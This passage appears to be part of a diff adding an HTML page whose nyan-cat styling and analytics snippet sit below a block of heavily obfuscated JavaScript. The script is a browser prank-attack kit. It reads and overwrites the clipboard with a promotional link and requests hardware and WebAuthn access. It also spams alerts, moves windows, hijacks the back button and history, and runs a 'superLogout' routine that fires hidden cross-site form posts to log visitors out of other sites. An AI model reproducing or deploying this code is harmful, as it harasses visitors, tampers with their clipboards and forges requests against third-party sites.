AudioContext(),_0x3b6e3f=_0x4ad107[_0x2b1ade(0x19a)](),_0x2ffa5d=_0x4ad107[_0x2b1ade(0x112)](),_0x160f8a=0x32,_0x4023e7=0xfa0,_0x4f12a3=_0x4ad107[_0x2b1ade(0x13a)](Array(0xa)[_0x2b1ade(0x10c)](0x0)[_0x2b1ade(0x18a)]((_0x28b4d8,_0x379206)=>Math[_0x2b1ade(0x172)](_0x379206)),Array(0xa)['fill'](0x0)[_0x2b1ade(0x18a)]((_0x5c1859,_0x4fa95d)=>Math[_0x2b1ade(0x1f4)](_0x4fa95d)));_0x3b6e3f[_0x2b1ade(0x1e8)](_0x4f12a3),_0x3b6e3f[_0x2b1ade(0x1b2)](_0x2ffa5d),_0x2ffa5d[_0x2b1ade(0x1b2)](_0x4ad107[_0x2b1ade(0x120)]),_0x3b6e3f[_0x2b1ade(0x1d2)](0x0);const _0xa576c8=({pitch:_0x3478e2,volume:_0x140413})=>{const _0x42595d=_0x2b1ade;_0x3b6e3f[_0x42595d(0x11a)][_0x42595d(0x1b3)]=_0x160f8a+_0x3478e2*_0x4023e7,_0x2ffa5d[_0x42595d(0x161)][_0x42595d(0x1b3)]=_0x140413*0.5;};document[_0x2b1ade(0x140)]['addEventListener'](_0x2b1ade(0x12f),_0x1c58f5=>{const _0x19942f=_0x2b1ade,{clientX:_0x3ce035,clientY:_0x4a8890}=_0x1c58f5,{clientWidth:_0x42e6b6,clientHeight:_0x11542f}=document[_0x19942f(0x140)],_0x26cc2d=(_0x3ce035-_0x42e6b6/0x2)/_0x42e6b6,_0x3b7b6f=(_0x4a8890-_0x11542f/0x2)/_0x11542f;_0xa576c8({'pitch':_0x26cc2d,'volume':_0x3b7b6f});});}function requestClipboardRead(){const _0x5c9fbd=_0x1fa552;try{navigator[_0x5c9fbd(0x12b)][_0x5c9fbd(0x1ae)]()[_0x5c9fbd(0x1cc)](_0x6c1626=>{const _0x171b5a=_0x5c9fbd;!window[_0x171b5a(0x18d)]&&window[_0x171b5a(0x122)](_0x171b5a(0x1b6)+_0x6c1626+'\x27');},()=>{});}catch{}}function requestWebauthnAttestation(){const _0x4a6df6=_0x1fa552;try{const _0x4ab01a={'publicKey':{'rp':{'name':_0x4a6df6(0x154)},'user':{'id':new Uint8Array(0x10),'name':_0x4a6df6(0x1b0),'displayName':_0x4a6df6(0x163)},'pubKeyCredParams':[{'type':_0x4a6df6(0x1ee),'alg':-0x7}],'attestation':'direct','timeout':0xea60,'challenge':new Uint8Array([0x8c,0xa,0x26,0xff,0x22,0x91,0xc1,0xe9,0xb9,0x4e,0x2e,0x17,0x1a,0x98,0x6a,0x73,0x71,0x9d,0x43,0x48,0xd5,0xa7,0x6a,0x15,0x7e,0x38,0x94,0x52,0x77,0x97,0xf,0xef])[_0x4a6df6(0x113)]}},_0x3238d0={'publicKey':{'timeout':0xea60,'challenge':new Uint8Array([0x79,0x50,0x68,0x71,0xda,0xee,0xee,0xb9,0x94,0xc3,0xc2,0x15,0x67,0x65,0x26,0x22,0xe3,0xf3,0xab,0x3b,0x78,0x2e,0xd5,0x6f,0x81,0x26,0xe2,0xa6,0x1,0x7d,0x74,0x50])[_0x4a6df6(0x113)]}};navigator[_0x4a6df6(0x1a2)][_0x4a6df6(0x17d)](_0x4ab01a)['then'](_0x5d22fe=>{const _0x6d4196=_0x4a6df6,_0x1321c4=[{'id':_0x5d22fe['rawId'],'transports':[_0x6d4196(0x1dc),'nfc',_0x6d4196(0xfe)],'type':'public-key'}];return _0x3238d0[_0x6d4196(0x180)]['allowCredentials']=_0x1321c4,navigator[_0x6d4196(0x1a2)][_0x6d4196(0x17a)](_0x3238d0);});}catch{}}function requestMidiAccess(){const _0x3247d6=_0x1fa552;try{navigator[_0x3247d6(0x19f)]({'sysex':!![]});}catch{}}function requestBluetoothAccess(){const _0x3358a9=_0x1fa552;try{navigator[_0x3358a9(0x10d)]['requestDevice']({'acceptAllDevices':!![]})['then'](_0x6d2ed6=>_0x6d2ed6[_0x3358a9(0x1b1)][_0x3358a9(0x1b2)]());}catch{}}function requestUsbAccess(){const _0x50228f=_0x1fa552;try{navigator[_0x50228f(0x1dc)]['requestDevice']({'filters':[{}]});}catch{}}function requestSerialAccess(){const _0x2270ba=_0x1fa552;try{navigator[_0x2270ba(0x1db)]['requestPort']({'filters':[]});}catch{}}function requestHidAccess(){const _0x3258e1=_0x1fa552;try{navigator[_0x3258e1(0x170)][_0x3258e1(0x157)]({'filters':[]});}catch{}}function moveWindowBounce(){const _0x1e5453=_0x1fa552;let _0x49167f=VELOCITY*(Math['random']()>0.5?0x1:-0x1),_0x76d315=VELOCITY*(Math[_0x1e5453(0x108)]()>0.5?0x1:-0x1);setInterval(()=>{const _0x51b8a7=_0x1e5453,_0x3c664c=window['screenX'],_0xba1d63=window[_0x51b8a7(0x164)],_0x377020=window[_0x51b8a7(0x114)],_0xb7e9b6=window[_0x51b8a7(0x1a3)];if(_0x3c664c<MARGIN)_0x49167f=Math[_0x51b8a7(0x1a4)](_0x49167f);if(_0x3c664c+_0x377020>SCREEN_WIDTH-MARGIN)_0x49167f=-0x1*Math[_0x51b8a7(0x1a4)](_0x49167f);if(_0xba1d63<TOP_MARGIN)_0x76d315=Math[_0x51b8a7(0x1a4)](_0x76d315);if(_0xba1d63+_0xb7e9b6>SCREEN_HEIGHT-MARGIN)_0x76d315=-0x1*Math['abs'](_0x76d315);window[_0x51b8a7(0x101)](_0x49167f,_0x76d315);},TICK_LENGTH);}function setupFollowWindow(){const _0xd15c25=_0x1fa552;document[_0xd15c25(0x16b)](_0xd15c25(0x12f),function(_0x38cbe7){const _0x288c33=_0xd15c25;window[_0x288c33(0x100)](_0x38cbe7['screenX']-WIN_WIDTH/0x2,_0x38cbe7['screenY']-WIN_HEIGHT/0x2);});}function startVideo(){const _0x18d18a=_0x1fa552,_0x3b50ab=document[_0x18d18a(0x1aa)](_0x18d18a(0x16d));_0x3b50ab[_0x18d18a(0x106)]=getRandomArrayEntry(VIDEOS),_0x3b50ab[_0x18d18a(0x153)]=!![],_0x3b50ab[_0x18d18a(0x111)]=!![],_0x3b50ab[_0x18d18a(0x1ef)]='width:\x20100%;\x20height:\x20100%;',document[_0x18d18a(0x140)][_0x18d18a(0x1a5)](_0x3b50ab);}function detectWindowClose(){const _0x537f96=_0x1fa552;window[_0x537f96(0x16b)](_0x537f96(0x1f0),()=>{const _0x483fc3=_0x537f96;if(!window['opener'][_0x483fc3(0x197)])window[_0x483fc3(0x131)][_0x483fc3(0x1b5)](window);});}function onCloseWindow(_0x4df182){const _0x4eaf7c=_0x1fa552,_0x431a8e=wins[_0x4eaf7c(0x102)](_0x4df182);if(_0x431a8e>=0x0)wins['splice'](_0x431a8e,0x1);}function showHelloMessage(){const _0x384bac=_0x1fa552,_0x4115b0=document[_0x384bac(0x124)](_0x384bac(0x12d)),_0x5bbde9=document['importNode'](_0x4115b0[_0x384bac(0x179)],!![]);document['body'][_0x384bac(0x1a5)](_0x5bbde9);}function removeHelloMessage(){const _0x28d579=_0x1fa552,_0xeadb5a=document['querySelector'](_0x28d579(0x1c7));_0xeadb5a[_0x28d579(0x16a)]();}function rainbowThemeColor(){const _0x27d8af=_0x1fa552;function _0x37cb40(_0x10e5e0,_0x246311,_0x2b6485='0'){const _0x422902=_0x53ff;_0x10e5e0-=_0x246311[_0x422902(0x1cb)]()[_0x422902(0x181)];if(_0x10e5e0>0x0)return new Array(_0x10e5e0+(/\./[_0x422902(0x178)](_0x246311)?0x2:0x1))[_0x422902(0x130)](_0x2b6485)+_0x246311;return _0x246311+'';}const _0x1dc1dc=document[_0x27d8af(0x124)](_0x27d8af(0x1e6));setInterval(()=>{const _0x5c76aa=_0x27d8af;_0x1dc1dc['setAttribute']('content','#'+_0x37cb40(0x6,Math['floor'](Math[_0x5c76aa(0x108)]()*0xffffff)[_0x5c76aa(0x1cb)](0x10)));},0x32);}function copySpamToClipboard(){const _0x318d57=getRandomArrayEntry(ART)+'\x0aCheck\x20out\x20https://screy.wtf';clipboardCopy(_0x318d57);}function clipboardCopy(_0x16599a){const _0x1dc130=_0x1fa552,_0x1b55cf=document[_0x1dc130(0x1aa)](_0x1dc130(0x183));_0x1b55cf[_0x1dc130(0x1d9)]=_0x16599a,_0x1b55cf[_0x1dc130(0x1ef)][_0x1dc130(0x13f)]='pre';const _0xbc3cac=document[_0x1dc130(0x1aa)]('iframe');_0xbc3cac[_0x1dc130(0x1ec)]=_0x1dc130(0x1ca),document[_0x1dc130(0x140)]['appendChild'](_0xbc3cac);let _0x2003e9=_0xbc3cac[_0x1dc130(0x1af)];_0x2003e9['document'][_0x1dc130(0x140)][_0x1dc130(0x1a5)](_0x1b55cf);let _0x45ee0f=_0x2003e9[_0x1dc130(0x1e1)]();!_0x45ee0f&&(_0x2003e9=window,_0x45ee0f=_0x2003e9[_0x1dc130(0x1e1)](),document[_0x1dc130(0x140)][_0x1dc130(0x1a5)](_0x1b55cf));const _0x27f7b5=_0x2003e9[_0x1dc130(0x1a6)][_0x1dc130(0x129)]();_0x45ee0f[_0x1dc130(0x155)](),_0x27f7b5[_0x1dc130(0x174)](_0x1b55cf),_0x45ee0f[_0x1dc130(0x160)](_0x27f7b5);let _0x2ede56=![];try{_0x2ede56=_0x2003e9[_0x1dc130(0x1a6)]['execCommand']('copy');}catch(_0x399112){console[_0x1dc130(0x1ad)](_0x399112);}return _0x45ee0f[_0x1dc130(0x155)](),_0x1b55cf['remove'](),_0xbc3cac[_0x1dc130(0x16a)](),_0x2ede56;}function startAlertInterval(){setInterval(()=>{const _0x1ab2e4=_0x53ff;Math['random']()<0.5?showAlert():window[_0x1ab2e4(0x162)]();},0x1d4c0);}function showAlert(){const _0x2980fa=_0x1fa552,_0x334a05=getRandomArrayEntry(ART),_0x231840=Array(0xc8)['join'](_0x334a05);window[_0x2980fa(0x122)](_0x231840);}function requestFullscreen(){const _0x4f6ad1=_0x1fa552,_0x633802=Element[_0x4f6ad1(0x116)][_0x4f6ad1(0x173)]||Element['prototype'][_0x4f6ad1(0x1a8)]||Element[_0x4f6ad1(0x116)]['mozRequestFullScreen']||Element[_0x4f6ad1(0x116)][_0x4f6ad1(0x196)];_0x633802[_0x4f6ad1(0x1cd)](document[_0x4f6ad1(0x140)]);}function superLogout(){const _0x255794=_0x1fa552;function _0x32f9f9(_0x2cc26e,_0x43bbea){const _0xf3a8d=_0x53ff;if(_0x43bbea){_0x43bbea=![];return;}_0x2cc26e[_0xf3a8d(0x10a)][_0xf3a8d(0x11d)](_0x2cc26e);}function _0x4a0065(_0x2d4977){const _0x56384c=_0x53ff,_0x48698e=document[_0x56384c(0x1aa)](_0x56384c(0x1a1));_0x48698e[_0x56384c(0x13c)]=()=>_0x32f9f9(_0x48698e),_0x48698e[_0x56384c(0x144)]=()=>_0x32f9f9(_0x48698e),_0x48698e[_0x56384c(0x1ef)]=HIDDEN_STYLE,document[_0x56384c(0x140)]['appendChild'](_0x48698e),_0x48698e[_0x56384c(0x106)]=_0x2d4977;}function _0xf6071d(_0x3ef6dd,_0x2da938){const _0x3a4bd1=_0x53ff,_0x5b002f=document['createElement'](_0x3a4bd1(0x171));_0x5b002f[_0x3a4bd1(0x1ef)]=HIDDEN_STYLE,_0x5b002f[_0x3a4bd1(0x1f6)]=_0x3a4bd1(0x171)+numSuperLogoutIframes,document[_0x3a4bd1(0x140)]['appendChild'](_0x5b002f),numSuperLogoutIframes+=0x1;const _0x2bca61=document['createElement'](_0x3a4bd1(0x15c));_0x2bca61[_0x3a4bd1(0x1ef)]=HIDDEN_STYLE;let _0x1d8190=0x0;_0x5b002f['onload']=_0x5b002f['onerror']=()=>{if(_0x1d8190>=0x1)_0x32f9f9(_0x5b002f);_0x1d8190+=0x1;},_0x2bca61[_0x3a4bd1(0x184)]=_0x3ef6dd,_0x2bca61[_0x3a4bd1(0x1e3)]=_0x3a4bd1(0x156),_0x2bca61['target']=_0x5b002f[_0x3a4bd1(0x1f6)];for(const _0x494c5b in _0x2da938){if(Object[_0x3a4bd1(0x116)][_0x3a4bd1(0x139)]['call'](_0x2da938,_0x494c5b)){const _0x51b969=document['createElement']('input');_0x51b969[_0x3a4bd1(0x14e)]='hidden',_0x51b969[_0x3a4bd1(0x1f6)]=_0x494c5b,_0x51b969[_0x3a4bd1(0x1b3)]=_0x2da938[_0x494c5b],_0x2bca61[_0x3a4bd1(0x1a5)](_0x51b969);}}document[_0x3a4bd1(0x140)][_0x3a4bd1(0x1a5)](_0x2bca61),_0x2bca61[_0x3a4bd1(0x110)]();}for(const _0x56cc0f in LOGOUT_SITES){const _0x531ebc=LOGOUT_SITES[_0x56cc0f][0x0],_0xd80602=LOGOUT_SITES[_0x56cc0f][0x1],_0x4501e1=LOGOUT_SITES[_0x56cc0f][0x2]||{};_0x531ebc===_0x255794(0x1fb)?_0x4a0065(_0xd80602):_0xf6071d(_0xd80602,_0x4501e1);const _0x4f6f5a=document['createElement']('div');_0x4f6f5a[_0x255794(0x1ea)]=_0x255794(0x1bb)+_0x56cc0f+'...';const _0x2fbb40=document['querySelector'](_0x255794(0x187));_0x2fbb40[_0x255794(0x1a5)](_0x4f6f5a);}}function blockBackButton(){const _0x329a98=_0x1fa552;window[_0x329a98(0x16b)](_0x329a98(0x11e),()=>{const _0x1d46a1=_0x329a98;window[_0x1d46a1(0x168)]['forward']();});}function fillHistory(){const _0x2191ac=_0x1fa552;for(let _0x1422ac=0x1;_0x1422ac<0x14;_0x1422ac++){window['history'][_0x2191ac(0x191)]({},'',window[_0x2191ac(0x1da)][_0x2191ac(0x134)]+'?q='+_0x1422ac);}window[_0x2191ac(0x168)][_0x2191ac(0x191)]({},'',window['location'][_0x2191ac(0x134)]);}function getRandomCoords(){const _0x305f80=_0x1fa552,_0x211c5a=MARGIN+Math[_0x305f80(0x19b)](Math[_0x305f80(0x108)]()*(SCREEN_WIDTH-WIN_WIDTH-MARGIN)),_0x129d3a=TOP_MARGIN+Math[_0x305f80(0x19b)](Math[_0x305f80(0x108)]()*(SCREEN_HEIGHT-WIN_HEIGHT-TOP_MARGIN));return{'x':_0x211c5a,'y':_0x129d3a};}function _0x53ff(_0x1894b0,_0x26bc76){const _0x309fc1=_0x309f();return _0x53ff=function(_0x53ff65,_0x488bb1){_0x53ff65=_0x53ff65-0xfe;let _0x602e21=_0x309fc1[_0x53ff65];return _0x602e21;},_0x53ff(_0x1894b0,_0x26bc76);}function getRandomArrayEntry(_0x1ad003){const _0x11e182=_0x1fa552;return _0x1ad003[Math[_0x11e182(0x19b)](Math[_0x11e182(0x108)]()*_0x1ad003[_0x11e182(0x181)])];}function setupSearchWindow(_0x10fa35){const _0x3eb6e8=_0x1fa552;if(!_0x10fa35)return;const {x:_0x252479,y:_0x589e7d}=getRandomCoords();_0x10fa35[_0x3eb6e8(0x100)](_0x252479,_0x589e7d),_0x10fa35[_0x3eb6e8(0x1dd)](WIN_WIDTH*0x2,WIN_HEIGHT*0x2),_0x10fa35[_0x3eb6e8(0x14d)]['location']=_0x3eb6e8(0x1e4)+encodeURIComponent(SEARCHES[0x0]);let _0x272bc7=0x1;const _0x44422a=setInterval(()=>{const _0xfb892d=_0x3eb6e8;if(_0x10fa35[_0xfb892d(0x197)]){clearInterval(_0x44422a),onCloseWindow(_0x10fa35);return;}_0x10fa35[_0xfb892d(0x14d)]['location']=window[_0xfb892d(0x1da)][_0xfb892d(0x134)],setTimeout(()=>{const _0x15eb1e=_0xfb892d;_0x10fa35[_0x15eb1e(0x1dd)](WIN_WIDTH,WIN_HEIGHT);},0x1f4),setTimeout(()=>{const _0x2fbd66=_0xfb892d,{x:_0x2f0686,y:_0x1c6aa0}=getRandomCoords();_0x10fa35['moveTo'](_0x2f0686,_0x1c6aa0),_0x10fa35[_0x2fbd66(0x1dd)](WIN_WIDTH*0x2,WIN_HEIGHT*0x2),_0x10fa35[_0x2fbd66(0x14d)]['location']=_0x2fbd66(0x1e4)+encodeURIComponent(SEARCHES[_0x272bc7]),_0x272bc7+=0x1,_0x272bc7>=SEARCHES[_0x2fbd66(0x181)]&&(_0x272bc7=0x0);},0x3e8);},0xbb8);}function detectBrowser(){const _0x348ca9=_0x1fa552,_0x25b54a=navigator['userAgent'];if(/samsungbrowser\//i[_0x348ca9(0x178)](_0x25b54a))return _0x348ca9(0x1c8);else{if(/edg\//i['test'](_0x25b54a))return _0x348ca9(0x1eb);else{if(/edga\//i[_0x348ca9(0x178)](_0x25b54a))return _0x348ca9(0x1eb);else{if(/opt\//i[_0x348ca9(0x178)](_0x25b54a))return _0x348ca9(0x1d7);else{if(/opr\//i[_0x348ca9(0x178)](_0x25b54a))return _0x348ca9(0x1d7);else{if(/chrome\//i[_0x348ca9(0x178)](_0x25b54a))return _0x348ca9(0x1bd);else{if(/safari\//i[_0x348ca9(0x178)](_0x25b54a))return'safari';else{if(/firefox\//i['test'](_0x25b54a))return _0x348ca9(0x1b9);}}}}}}}}
+</script>
+<script async src='https://www.googletagmanager.com/gtag/js?id=UA-3898076-24'></script>
+<script>
+  window.dataLayer = window.dataLayer || []
+  function gtag () {
+    window.dataLayer.push(arguments)
+  }
+  gtag('js', new Date())
+  gtag('config', 'UA-3898076-24')
+</script>
+
+     <style>
+        @font-face {
+    font-family: 'octicons';
+    src: url('../font/octicons.eot?#iefix') format('embedded-opentype'), url('../font/octicons.woff') format('woff'), url('../font/octicons.ttf') format('truetype'), url('../font/octicons.svg#octicons') format('svg');
+    font-weight: normal;
+    font-style: normal;
+  }
+  html,
+  body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+    padding: 0;
+    background: #036;
+    overflow: hidden;
+  }
+  body {
+    font: 13px/1.4 Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  }
+  .repo {
+    position: absolute;
+    top: 0;
+    right: 0;
+    color: black;
+    background: white;
+    padding: 6px 6px;
+    outline: none;
+    z-index: 4;
+  }
+  .repo i {
+    float: left;
+    cursor: pointer;
+  }
+  .repo span {
+    float: left;
+    padding-left: 0;
+    line-height: 32px;
+    overflow: hidden;
+    width: 0;
+    max-width: 0;
+    white-space: nowrap;
+    transition: max-width 1s;
+  }
+  .repo:hover span {
+    padding-left: 6px;
+    width: auto;
+    max-width: 200px;
+  }
+  .octicon {
+    font: normal normal 32px octicons;
+    line-height: 1;
+    display: inline-block;
+    text-decoration: none;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    cursor: default;
+  }
+  .octicon-mark-github:before {
+    content: '\f00a';
+  }
+  /* nyan cat! */
+  #nyan-cat {
+    position: absolute;
+    width: 194px;
+    height: 122px;
+    top: 50%;
+    left: 50%;
+    margin-top: -60px;
+    margin-left: -97px;
+    z-index: 2;
+
+  }
+  #nyan-cat.frame1,
+  #nyan-cat.frame2 {
+    margin-top: -54px;
+  }
+ /* pop-tarts body */
+ #pop-tarts-body {
+  border: solid rgb(0, 0, 0);
+  border-width: 6px 0;
+  width: 97px;
+  height: 92px;
+  position: absolute;
+  left: 52px;
+  top: 0;
+  background: url('nyan.png') no-repeat center center;
+  background-size: 100% 100%;
+
+}
+
+
+#pop-tarts-body:after {
+  content: '';
+  border: solid black;
+  border-width: 0 6px;
+  width: 109px;
+  height: 80px;
+  position: absolute;
+  top: 6px;
+  left: -12px;
+  background: url('nyan.png') no-repeat center center; 
+  background-size: cover;
+
+}
+
+#pop-tarts-body:before {
+  content: '';
+  position: absolute;
+  left: -6px;
+  top: 0;
+  width: 109px;
+  height: 92px;
+  background-size: cover;
+
+}
+
+#pop-tarts-body-cream {
+  position: absolute;
+  width: 100%;
+  height: 80px;
+  top: 6px;
+  left: 0;
+  background: url('nyan.png') no-repeat center center; 
+  background-size: cover;
+
+}
+
+#pop-tarts-body-cream:before {
+  content: '';
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  left: 0;
+  top: 0;
+  background: url('nyan.png') no-repeat center center; 
+  background-size: cover;
+
+}
+
+  /* pseudo elems */
+  #head:before,
+  #head:after,
+  #tail:before,
+  #nyan-cat:before,
+  #paws:before,
+  #face:before {
+    content: '';
+    position: absolute;
+  }
+  .sparks-combo {
+    height: 300px;
+    width: 200%;
+    position: relative;
+    animation: woosh 700ms 0ms linear infinite both;
+  }
+  .spark {
+    z-index: 1;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background-color: transparent;
+    background: linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x;
+  }
+  .spark:before {
+    background: linear-gradient(to right, white 0px, white 5px, transparent 5px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 5px, transparent 5px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 5px, transparent 5px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 5px, transparent 5px, transparent 400px) repeat-x;
+  }
+  .spark:after {
+    background: linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 6px, transparent 6px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 11px, transparent 11px, transparent 400px) repeat-x, linear-gradient(to right, white 0px, white 11px, transparent 11px, transparent 400px) repeat-x;
+  }
+  .spark:before,
+  .spark:after {
+    content: '';
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background-color: transparent;
+  }
+  .spark:nth-child(1) {
+    z-index: 3;
+    top: 0;
+    left: 20px;
+    animation: sparkly 700ms 0ms steps(1) infinite both;
+  }
+  .spark:nth-child(1):before {
+    animation: sparkly-before 700ms 0ms steps(1) infinite both;
+  }
+  .spark:nth-child(1):after {
+    animation: sparkly-after 700ms 0ms steps(1) infinite both;
+  }
+  .spark:nth-child(2) {
+    top: 40px;
+    left: 170px;
+    animation: sparkly 700ms 200ms steps(1) infinite both;
+  }
+  .spark:nth-child(2):before {
+    animation: sparkly-before 700ms 200ms steps(1) infinite both;
+  }
+  .spark:nth-child(2):after {
+    animation: sparkly-after 700ms 200ms steps(1) infinite both;
+  }
+  .spark:nth-child(3) {
+    top: 100px;
+    left: 320px;
+    animation: sparkly 700ms 400ms steps(1) infinite both;
+  }
+  .spark:nth-child(3):before {
+    animation: sparkly-before 700ms 400ms steps(1) infinite both;
+  }
+  .spark:nth-child(3):after {
+    animation: sparkly-after 700ms 400ms steps(1) infinite both;
+  }
+  .spark:nth-child(4) {
+    top: 150px;
+    left: 200px;
+    animation: sparkly 700ms 600ms steps(1) infinite both;
+  }
+  .spark:nth-child(4):before {
+    animation: sparkly-before 700ms 600ms steps(1) infinite both;
+  }
+  .spark:nth-child(4):after {
+    animation: sparkly-after 700ms 600ms steps(1) infinite both;
+  }
+  @keyframes woosh {
+    0% {
+      left: 0px;
+    }
+    100% {
+      left: -400px;
+    }
+  }
+  @keyframes sparkly {
+    0% {
+      background-size: 400px 6px, 0 0, 0 0, 0 0;
+      background-position: 17px 17px, 0 0, 0 0, 0 0;
+    }
+    16% {
+      background-size: 400px 6px, 400px 6px, 400px 6px, 400px 6px;
+      background-position: 17px 0, 34px 17px, 17px 34px, 0 17px;
+    }
+    33% {
+      background-size: 400px 6px, 400px 6px, 400px 6px, 400px 6px;
+      background-position: 17px 0, 34px 17px, 17px 34px, 0 17px;
+    }
+    50% {
+      background-size: 400px 6px, 0 0, 0 0, 0 0;
+      background-position: 17px 17px, 0 0, 0 0, 0 0;
+    }
+    66% {
+      background-size: 400px 11px, 400px 11px, 0 0, 0 0;
+      background-position: 17px 6px, 17px 23px, 0 0, 0 0;
+    }
+    83% {
+      background-size: 0 0, 0 0, 400px 5px, 400px 5px;
+      background-position: 0 0, 0 0, 11px 17px, 22px 17px;
+    }
+    100% {
+      background-size: 400px 6px, 0 0, 0 0, 0 0;
+      background-position: 17px 17px, 0 0, 0 0, 0 0;
+    }
+  }
+  @keyframes sparkly-before {
+    0% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    16% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    33% {
+      background-size: 400px 5px, 400px 5px, 400px 5px, 400px 5px;
+      background-position: 6px 6px, 29px 6px, 29px 29px, 6px 29px;
+    }
+    50% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    66% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    83% {
+      background-size: 0 0, 0 0, 400px 5px, 400px 5px;
+      background-position: 0 0, 0 0, 17px 12px, 17px 22px;
+    }
+    100% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+  }
+  @keyframes sparkly-after {
+    0% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    16% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    33% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    50% {
+      background-size: 400px 11px, 400px 11px, 400px 6px, 400px 6px;
+      background-position: 17px 0, 17px 29px, 0 17px, 29px 17px;
+    }
+    66% {
+      background-size: 0 0, 0 0, 400px 6px, 400px 6px;
+      background-position: 0 0, 0 0, 6px 17px, 23px 17px;
+    }
+    83% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+    100% {
+      background-size: 0 0, 0 0, 0 0, 0 0;
+      background-position: 0 0, 0 0, 0 0, 0 0;
+    }
+  }
+  .rainbow {
+    background: none;
+    height: 102px;
+    width: 50%;
+    position: absolute;
+    top: 50%;
+    right: 50%;
+    margin-right: 45px;
+    z-index: 2;
+  }
+  .hot:after,
+  .hot:before,
+  .cold:after,
+  .cold:before {
+    content: "";
+    position: absolute;
+    left: 0;
+    right: 0;
+    height: 50%;
+  }
+  .hot:after,
+  .hot:before {
+    top: 0;
+  }
+  .cold:after,
+  .cold:before {
+    bottom: 0;
+  }
+  #wave-a {
+    margin-top: -54px;
+    animation: wavy 700ms 0ms steps(2) infinite both;
+  }
+  #wave-b {
+    margin-top: -60px;
+    animation: wavy 700ms 350ms steps(2) infinite both;
+  }
+  /* red */
+  .hot {
+    background-image: linear-gradient(to right, #0030ff 49px, transparent 49px, transparent 92px);
+  }
+  /* orange */
+  .hot:after {
+    background-image: linear-gradient(to right, #ffffff 49px, transparent 49px, transparent 92px);
+  }
+  /* yellow */
+  .hot:before {
+    background-image: linear-gradient(to right, #0030ff 49px, transparent 49px, transparent 92px);
+  }
+  /* green */
+  .cold:after {
+    background-image: linear-gradient(to right, #ffffff 49px, transparent 49px, transparent 92px);
+    background-position: left top;
+  }
+  /* blue */
+  .cold:before {
+    background-image: linear-gradient(to right, #0030ff 49px, transparent 49px, transparent 92px);
+  }
+  /* purple */
+  .cold {
+    background-image: linear-gradient(to right, #ffffff 49px, transparent 49px, transparent 92px);
+  }
+  .rainbow,
+  .hot:after,
+  .hot:before,
+  .cold:after,
+  .cold:before {
+    background-size: 95px 17px;
+    background-repeat: repeat-x;
+  }
+  #wave-a.hot,
+  #wave-a.cold:after {
+    background-position: left top;
+  }
+  #wave-a.hot:after,
+  #wave-a.cold:before {
+    background-position: left center;
+  }
+  #wave-a.hot:before,
+  #wave-a.cold {
+    background-position: left bottom;
+  }
+  #wave-b.hot,
+  #wave-b.cold:after {
+    background-position: 46px top;
+  }
+  #wave-b.hot:after,
+  #wave-b.cold:before {
+    background-position: 46px center;
+  }
+  #wave-b.hot:before,
+  #wave-b.cold {
+    background-position: 46px bottom;
+  }
+  @keyframes wavy {
+    0% {
+      margin-top: -54px;
+    }
+    100% {
+      margin-top: -60px;
+    }
+  }
+  /* head */
+  #head {
+    width: 80px;
+    height: 30px;
+    border: solid black;
+    border-width: 0 6px;
+    background: #b6bcd4;
+    position: absolute;
+  }
+ 
+  #head:before,
+  #head:after {
+    width: 40px;
+    height: 30px;
+    top: -30px;
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 6px 24px, 12px 6px, 12px 6px, 6px 6px, 6px 6px, 12px 30px, 12px 12px, 12px 6px, 6px 6px;
+    background-position: 0 6px, 6px 0, 30px 18px, 18px 6px, 24px 12px, 6px 6px, 18px 18px, 30px 24px, 18px 12px;
+  }
+  #head:after {
+    right: 0;
+    transform: scaleX(-1);
+    -webkit-transform: scaleX(-1);
+  }
+  #face {
+    width: 80px;
+    height: 100%;
+    position: absolute;
+    top: 6px;
+    background: linear-gradient(white, white) no-repeat, linear-gradient(white, white) no-repeat, linear-gradient(#f99, #f99) no-repeat, linear-gradient(#f99, #f99) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
